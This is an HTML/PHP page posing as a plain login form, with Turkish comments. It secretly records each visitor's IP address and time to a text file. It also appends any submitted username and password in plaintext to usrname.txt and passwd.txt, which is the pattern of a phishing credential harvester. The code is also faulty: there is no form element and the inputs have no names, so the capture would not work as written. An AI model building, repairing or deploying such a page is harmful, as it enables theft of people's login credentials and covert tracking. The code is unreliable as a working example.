<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }



    </style>
</head>
<body>
    <div class="login">
        <input type="username" id="inp1" placeholder="username: "><br>
        <input type="password" id="inp2" placeholder="password: "><br>

        <button class="btn"></button>
    </div>

    <?php
    
    function getRealIpAddr() {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            // IP paylaşımlı internetten
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            // IP bir proxy üzerinden geçmiş
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            // Doğrudan bir bağlantıdan IP
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
    
    // IP adresini al
    $ipaddr = getRealIpAddr();
    
    // 'ip.txt' dosyasını aç veya oluştur ve IP adresini kaydet
    $file = 'ip.txt';
    // Güvenli bir şekilde dosyayı aç
    if ($fp = fopen($file, 'a')) {
        fwrite($fp, "IP: " . $ipaddr . " - Zaman: " . date("Y-m-d H:i:s") . "\n");
        fclose($fp);
        echo "IP adresiniz kaydedildi.";
    } else {
        echo "Dosya yazma hatası.";
    }

    // Girilen kullanıcı adını username.txt adlı dosyaya kaydetme:
    if (isset($_POST['btn'])) {
        $data = $_POST['inp1'] . "\n"; // Alınan veriyi bir değişkene ata ve sonuna yeni satır karakteri ekle
        $filePath = "usrname.txt"; // Verinin yazılacağı dosyanın yolu
    
        // Dosyayı aç veya oluştur, veriyi dosyanın sonuna ekle
        if (file_put_contents($filePath, $data, FILE_APPEND)) {
            echo "Veri başarıyla kaydedildi.";
        } else {
            echo "Veri kaydedilemedi.";
        }
    }

    // Girilen şifreyi password.txt dosyasına kaydetme:
        if (isset($_POST['btn'])) {
            $data = $_POST['inp2'] . "\n"; // Alınan veriyi bir değişkene ata ve sonuna yeni satır karakteri ekle
            $filePath = "passwd.txt"; // Verinin yazılacağı dosyanın yolu
        
            // Dosyayı aç veya oluştur, veriyi dosyanın sonuna ekle
            if (file_put_contents($filePath, $data, FILE_APPEND)) {
                echo "Veri başarıyla kaydedildi.";
            } else {
                echo "Veri kaydedilemedi.";
            }
        }

    ?>

</body>
</html>